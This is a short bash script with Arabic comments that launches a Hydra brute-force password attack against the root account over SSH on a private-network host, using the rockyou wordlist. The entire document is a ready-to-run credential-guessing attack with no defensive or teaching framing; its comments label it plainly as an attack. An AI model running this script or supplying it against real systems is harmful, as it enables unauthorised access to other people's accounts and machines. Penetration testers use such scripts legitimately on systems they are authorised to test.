#!/bin/bash

# هدف الهجوم
TARGET="192.168.1.10"

# الخدمة: SSH أو FTP أو HTTP أو غيرها
SERVICE="ssh"

# اسم المستخدم لتجربته
USERNAME="root"

# مسار قائمة كلمات المرور
WORDLIST="/usr/share/wordlists/rockyou.txt"

# تنفيذ الهجوم باستخدام Hydra
hydra -l $USERNAME -P $WORDLIST $SERVICE://$TARGET -t 4 -V -f
